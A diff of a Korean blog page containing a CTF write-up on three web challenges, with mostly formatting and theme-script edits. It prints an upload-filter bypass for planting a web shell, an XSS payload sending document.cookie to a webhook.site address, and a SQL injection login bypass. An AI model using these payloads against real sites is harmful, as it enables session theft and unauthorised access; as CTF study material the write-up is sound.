@@ -295,7 +295,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post focus' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
@@ -392,9 +392,71 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <h3 id="1-web-5shared"><a href="#1-web-5shared" class="headerlink" title="1. web(5shared)"></a>1. web(5shared)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;lib.php&#x27;</span>;<br><br>session_start();<br><span class="hljs-variable">$session</span> = md5(session_id());<br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&quot;/~uploads/<span class="hljs-subst">&#123;$session&#125;</span>/&quot;</span>;<br><br>createDirectory(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&quot;/~uploads/&quot;</span>);<br>createDirectory(<span class="hljs-variable">$uploaddir</span>);<br><br><span class="hljs-comment">//print_r($_FILES[&#x27;file&#x27;]);</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$uploadfile</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br><span class="hljs-comment">// sanity check</span><br><span class="hljs-variable">$extension</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>])[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$extension</span>, <span class="hljs-keyword">Array</span>(<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>)))<br>&#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$message</span>);<br>&#125;<br><br><span class="hljs-comment">// the real sanity check</span><br><span class="hljs-variable">$real_extension</span> = array_pop(explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$message</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">4096</span>)<br>&#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;최대 4mb까지 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$message</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadfile</span>))<br>&#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;성공적으로 파일이 업로드되었습니다.&#x27;); location.href = &#x27;/&#x27;; &lt;/script&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br>&#125;<br><br><br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;업로드 에러&#x27;); history.back(); &lt;/script&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+  <h3 id="1-web-5shared"><a href="#1-web-5shared" class="headerlink" title="1. web(5shared)"></a>1. web(5shared)</h3><pre><code class="php">&lt;?php
+
+require_once &#39;lib.php&#39;;
+
+session_start();
+$session = md5(session_id());
+$uploaddir = __DIR__ . &quot;/~uploads/&#123;$session&#125;/&quot;;
+
+createDirectory(__DIR__ . &quot;/~uploads/&quot;);
+createDirectory($uploaddir);
+
+//print_r($_FILES[&#39;file&#39;]);
+$file = $_FILES[&#39;file&#39;];
+$uploadfile = $uploaddir . $file[&#39;name&#39;];
+
+// sanity check
+$extension = explode(&#39;.&#39;, $file[&#39;name&#39;])[1];
+if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;)))
+&#123;
+    $message = &quot;&lt;script&gt;alert(&#39;jpg, gif, png 확장자만 업로드할 수 있습니다.&#39;); history.back(); &lt;/script&gt;&quot;;
+    die($message);
+&#125;
+
+// the real sanity check
+$real_extension = array_pop(explode(&#39;.&#39;, $file[&#39;name&#39;]));
+if (preg_match(&quot;/php/i&quot;, $file[&#39;name&#39;]))
+&#123;
+    $message = &quot;&lt;script&gt;alert(&#39;파일 이름에 php가 들어가면 안됩니다.&#39;); history.back(); &lt;/script&gt;&quot;;
+    die($message);
+&#125;
+
+if ($file[&#39;size&#39;] &gt; 4096)
+&#123;
+    $message = &quot;&lt;script&gt;alert(&#39;최대 4mb까지 업로드할 수 있습니다.&#39;); history.back(); &lt;/script&gt;&quot;;
+    die($message);
+&#125;
+
+if (move_uploaded_file($file[&#39;tmp_name&#39;], $uploadfile))
+&#123;
+    $message = &quot;&lt;script&gt;alert(&#39;성공적으로 파일이 업로드되었습니다.&#39;); location.href = &#39;/&#39;; &lt;/script&gt;&quot;;
+    echo $message;
+&#125;
+
+
+else
+&#123;
+    $message = &quot;&lt;script&gt;alert(&#39;업로드 에러&#39;); history.back(); &lt;/script&gt;&quot;;
+    echo $message;
+&#125;</code></pre>
 <p>코드가 좀 긴편인데 주요 부분들만 한번 확인 해보자,</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// sanity check</span><br><span class="hljs-variable">$extension</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>])[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$extension</span>, <span class="hljs-keyword">Array</span>(<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>)))<br>&#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$message</span>);<br>&#125;<br><br><span class="hljs-comment">// the real sanity check</span><br><span class="hljs-variable">$real_extension</span> = array_pop(explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$message</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre><code class="php">// sanity check
+$extension = explode(&#39;.&#39;, $file[&#39;name&#39;])[1];
+if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;)))
+&#123;
+    $message = &quot;&lt;script&gt;alert(&#39;jpg, gif, png 확장자만 업로드할 수 있습니다.&#39;); history.back(); &lt;/script&gt;&quot;;
+    die($message);
+&#125;
+
+// the real sanity check
+$real_extension = array_pop(explode(&#39;.&#39;, $file[&#39;name&#39;]));
+if (preg_match(&quot;/php/i&quot;, $file[&#39;name&#39;]))
+&#123;
+    $message = &quot;&lt;script&gt;alert(&#39;파일 이름에 php가 들어가면 안됩니다.&#39;); history.back(); &lt;/script&gt;&quot;;
+    die($message);
+&#125;</code></pre>
 <p>웹쉘 업로드 문제이기 때문에 사실상 이 부분만 우회할 수 있다면 금방 풀 수 있다.</p>
 <p>sanity check 부분에 보면 argv[1] 로 오는 문자를 검사하는데,<br>jpg, gif, png 만 허용시켜 둔 상황이다.</p>
 <p>그런데 php에선 또 이상한 문제점이 우리를 반겨준다. 저렇게 검사할 경우에 다음과 같은 트릭을 사용할 수 있다.</p>
@@ -405,12 +467,47 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>upload) test.jpg.phtml<br>위와 같이 파일 명을 바꾸고, 웹 쉘을 업로드 시키면 된다.</p>
 <hr>
 <h3 id="2-web-simple-xss"><a href="#2-web-simple-xss" class="headerlink" title="2. (web) simple xss"></a>2. (web) simple xss</h3><p>문제에 들어가면 게시판이 있는데 그냥 글쓰기 부분에서 xss payload 넣고,<br>봇의 쿠키를 탈취하면 된다.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">location.href=<span class="hljs-string">&#x27;https://webhook.site/~&#x27;</span>+document.cookie;<br></code></pre></td></tr></table></figure>
+<pre><code class="bash">location.href=&#39;https://webhook.site/~&#39;+document.cookie;</code></pre>
 <hr>
-<h3 id="3-web-simple-sqli"><a href="#3-web-simple-sqli" class="headerlink" title="3. (web) simple sqli"></a>3. (web) simple sqli</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-comment">//error_reporting(E_ALL); </span><br><span class="hljs-comment">//ini_set(&quot;display_errors&quot;, 1); </span><br><br><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;lib.php&#x27;</span>; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;view-source&#x27;</span>]))&#123; <br>    highlight_file(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">exit</span>; <br>&#125; <br><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]; <br><span class="hljs-variable">$pw</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>]; <br><br><span class="hljs-comment">//var_dump($conn); </span><br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/information|admin|or|\=| |\#|\&#x27;|_|where/i&quot;</span>, <span class="hljs-variable">$id</span> . <span class="hljs-variable">$pw</span>)) <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No Hack ~_~&quot;</span>); <br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$pw</span>)) &#123; <br>    <span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE `id` = trim(&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27;) AND `pw` = trim(&#x27;<span class="hljs-subst">&#123;$pw&#125;</span>&#x27;)&quot;</span>; <br>    <span class="hljs-variable">$result</span> = mysqli_fetch_array(mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$query</span>)); <br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;id&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span>) <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;<span class="hljs-subst">&#123;$flag&#125;</span>&lt;/h1&gt;&quot;</span>; <br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) &#123; <br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$result[&#x27;id&#x27;]&#125;</span>님 안녕하세요!&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;</span>; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="3-web-simple-sqli"><a href="#3-web-simple-sqli" class="headerlink" title="3. (web) simple sqli"></a>3. (web) simple sqli</h3><pre><code class="php">&lt;?php 
+
+//error_reporting(E_ALL); 
+//ini_set(&quot;display_errors&quot;, 1); 
+
+
+require &#39;lib.php&#39;; 
+
+if (isset($_GET[&#39;view-source&#39;]))&#123; 
+    highlight_file(__FILE__); 
+    exit; 
+&#125; 
+
+$id = $_POST[&#39;id&#39;]; 
+$pw = $_POST[&#39;pw&#39;]; 
+
+//var_dump($conn); 
+
+if (preg_match(&quot;/information|admin|or|\=| |\#|\&#39;|_|where/i&quot;, $id . $pw)) 
+    die(&quot;No Hack ~_~&quot;); 
+
+if (isset($id, $pw)) &#123; 
+    $query = &quot;SELECT * FROM `users` WHERE `id` = trim(&#39;&#123;$id&#125;&#39;) AND `pw` = trim(&#39;&#123;$pw&#125;&#39;)&quot;; 
+    $result = mysqli_fetch_array(mysqli_query($conn, $query)); 
+
+    if ($result[&#39;id&#39;] === &#39;admin&#39;) 
+        echo &quot;&lt;h1&gt;&#123;$flag&#125;&lt;/h1&gt;&quot;; 
+
+    if ($result[&#39;id&#39;]) &#123; 
+        $message = &quot;&#123;$result[&#39;id&#39;]&#125;님 안녕하세요!&quot;; 
+    &#125; else &#123; 
+        $message = &quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;; 
+    &#125; 
+&#125; 
+?&gt;</code></pre>
 <p>페이지 로그인 코드는 다음과 같다.<br>$id, $pw 에 입력되는 값에서 information, admin, or 등 여러가지를 필터링 한다.</p>
 <p>이 정규식 검증 부분들은 tab, like 문자를 통해서 쿼리문을 완성할 수 있다.</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span>\<span class="hljs-operator">&amp;</span>pw<span class="hljs-operator">=</span>)<span class="hljs-operator">||</span> id <span class="hljs-keyword">like</span> &quot;ad&quot; &quot;min&quot;<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+<pre><code class="sql">id=\&amp;pw=)|| id like &quot;ad&quot; &quot;min&quot;-- -</code></pre>
+
   
   
     
@@ -423,7 +520,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">angstorm ctf 2020 Write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/06/19/bangsiri-wargame-200619/" title="동아리 워게임 홍보(?)" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">동아리 워게임 홍보(?)</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">angstorm ctf 2020 Write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/06/19/bangsiri-wargame-200619/" title="동아리 워게임 홍보(?)" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">동아리 워게임 홍보(?)</span></a></div></section></div>
       
       
       
@@ -476,7 +573,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <a class='next' href='/2020/02/05/dockerfile-200205/'>
           <p class='title'>CTF Web Challenge(Dockerfile)<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
           <p class='content'>간단한 버전이라서 쓰는 사람에 맞게 적절히 수정하면 된다.
-12345678910111213141516FROM ubuntu:18.04ENV DEBIAN_FRONTEND=noni...</p>
+FROM ubuntu:18.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+ENV TERM=l...</p>
         </a>
       
     </div>
@@ -691,7 +791,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -770,7 +870,7 @@ var loadCSS = function( href, before, media, attributes ){
   function loadIssuesJS() {
     if ($(".md").find(".issues-api").length == 0) return;
 	
-	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/issues.min.js');
+	  loadScript('/js/issues.js');
 	
   };
   $(function () {
@@ -888,29 +988,6 @@ var loadCSS = function( href, before, media, attributes ){
 
 
 
-   <script type="text/javascript">
-  loadScript("https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js")
-  function pjax_scrollrebeal() {
-    ScrollReveal().reveal('.l_main .reveal', {
-      distance: '32px',
-      duration: '800',
-      interval: '20',
-      scale: '1',
-      easing: 'ease-out'
-    });
-  }
-  $(function () {
-  var checkScrollReveal = setInterval(function () {
-    if ($("#safearea").css("display")!="block") return
-    if (typeof ScrollReveal=="undefined") return
-    clearInterval(checkScrollReveal)
-	pjax_scrollrebeal();
-  }, 100)
-  });
-  volantis.pjax.push(pjax_scrollrebeal)
-</script>
-
-
 
 
 
@@ -1012,7 +1089,7 @@ var loadCSS = function( href, before, media, attributes ){
 
 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/app.min.js"></script>
+<script src="/js/app.js"></script>
 
 
 
@@ -1024,7 +1101,7 @@ const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
 
 $('.input.u-search-input').one('focus',function(){
 	
-		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/search/hexo.min.js',setSearchService);
+		loadScript('/js/search/hexo.js',setSearchService);
 	
 })
 
